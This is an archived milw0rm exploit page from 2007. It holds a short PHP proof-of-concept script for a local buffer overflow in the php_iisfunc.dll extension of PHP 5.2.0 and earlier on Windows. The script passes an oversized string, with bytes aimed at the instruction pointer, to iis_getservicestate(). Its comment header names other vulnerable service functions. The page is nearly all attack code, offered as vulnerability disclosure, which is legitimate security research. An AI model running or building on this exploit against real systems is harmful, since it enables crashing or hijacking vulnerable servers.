<html><head><title>PHP <= 5.2.0 (php_iisfunc.dll) Local Buffer Overflow PoC (win32)</title></head><pre>&lt;?php
// ==================================================================================
//
//  php_iisfunc.dll PHP &lt;= 5.2.0 (win32) Buffer Overflow PoC
//
//      Discovery: boecke &lt;boecke@herzeleid.net&gt;
//      Risk: Local Buffer Overflow (Medium - High Risk)
//      Notes: Various other functions are exploitable, all of which convert the
//      string argument(s) to unicode.
//
//      extern &quot;C&quot; IISFUNC_API int fnStartService(LPCTSTR ServiceId);
//      extern &quot;C&quot; IISFUNC_API int fnGetServiceState(LPCTSTR ServiceId);
//      extern &quot;C&quot; IISFUNC_API int fnStopService(LPCTSTR ServiceId);
//
//      &quot;Sangre, sonando, de rabia naci.. Who do you trust?&quot;
//       - Cygnus, Vismund Cygnus: Sarcophagi
//
// ==================================================================================

if ( !extension_loaded( &quot;iisfunc&quot; ) )
{
       die( &quot;Extension not loaded.\n&quot; );
}

$buf_unicode = str_repeat( &quot;A&quot;, 256 );
$eip_unicode = &quot;\x41\x41&quot;;

iis_getservicestate( $buf_unicode . $eip_unicode );

?&gt;

# milw0rm.com [2007-08-27]</pre></html>